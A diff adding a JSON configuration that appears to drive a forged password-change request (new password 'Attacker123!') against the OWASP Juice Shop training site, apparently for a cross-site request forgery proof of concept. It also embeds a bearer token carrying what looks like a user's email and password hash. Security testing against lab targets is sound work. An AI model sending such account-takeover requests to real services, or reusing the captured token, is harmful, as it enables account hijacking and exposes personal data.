@@ -1,0 +1,21 @@
+{
+  "base_url": "https://juice-shop.herokuapp.com",
+  "actions": [
+    {
+      "name": "ChangePassword",
+      "method": "POST",
+      "url": "https://juice-shop.herokuapp.com/rest/user/change-password",
+      "params": {
+        "current": "password123@24",
+        "new": "Attacker123!",
+        "repeat": "Attacker123!"
+      },
+      "body_format": "json"
+    }
+  ],
+  "optional": {
+    "auth_header": "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MzAsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJuZXJ1LmthbGthckBnbWFpbC5jb20iLCJwYXNzd29yZCI6IjBlZDVjOTAzNmE0Yjc1ZDAxMzVmNGViNDQ1MDg2YmJjIiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNS0wOC0yOSAyMDoxMzoxMy43MTIgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNS0wOC0yOSAyMDoxMzoxMy43MTIgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzU2NDk4Mzk5fQ.VngpmeZgehhTyXmWRD5ErV-pmaTFYgmUcYvo4JojkHfp-MgjECJuJBcSKgaCys62NEEMTcEtxuj351MpwHum4BeLdRMJTsW3grXkh-K7jf0f25HUfYujcxDzfg1-y9MGmG6CjVA6y5LpYHfLXpQpsBUHcSSujzSip3ouB2bcvac",
+    "noreferrer": true,
+    "bounce_url": "https://juice-shop.herokuapp.com"
+  }
+}
